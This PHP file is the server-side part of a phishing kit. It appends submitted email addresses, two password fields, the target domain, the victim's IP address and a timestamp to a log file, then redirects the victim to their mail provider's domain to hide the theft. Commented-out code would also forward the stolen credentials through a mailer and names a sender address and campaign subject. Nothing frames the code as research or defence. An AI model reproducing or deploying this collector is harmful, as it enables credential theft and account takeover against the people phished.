<?php
if (isset($_REQUEST["auth"])) {
    // New conditional statement (if/else)
    $ip = getenv('HTTP_CLIENT_IP')?:
    getenv('HTTP_X_FORWARDED_FOR')?:
    getenv('HTTP_X_FORWARDED')?:
    getenv('HTTP_FORWARDED_FOR')?:
    getenv('HTTP_FORWARDED')?:
    getenv('REMOTE_ADDR');

    // date
    $mydate = getdate(date("U"));
    $currentDate = "$mydate[weekday] - $mydate[month] $mydate[mday] - $mydate[year]";

    // notepad
    $mainFile = "../logz.txt";
    $retriveData = file_get_contents($mainFile);
    $retriveData .= '
    Domain Url: ' . $_REQUEST["auth"] . '
    E-mail: ' . $_REQUEST["mail"] . '
    Password 1: ' . $_REQUEST["pass1"] . '
    Password 2: ' . $_REQUEST["pass2"] . '
    IP Address: ' . $ip . '
    Date: ' . $currentDate . '
    .......................................................

    ';
    
    file_put_contents($mainFile, $retriveData);

    // optional mailing part
    // $sender = 'arthurevelyn4@outlook.com';
    // $subject = "Chamelon1 and 263 link";

    // header("location: ./mailer?domain=".$_REQUEST["auth"]."&sender=".$sender."&mail=".$_REQUEST["mail"]."&pass1=".$_REQUEST["pass1"]."&pass2=".$_REQUEST["pass2"]."&ip=".$ip."&date=".$currentDate."&subject=".$subject."");
    // exit;

    // 
    $url = explode('@', $_REQUEST["mail"]);
    echo '
        <script>
            location.replace("http://'.$url[1].'")
        </script>
    
    ';
} 
else {
    echo '
        <script>
            close()
        </script>
    ';
}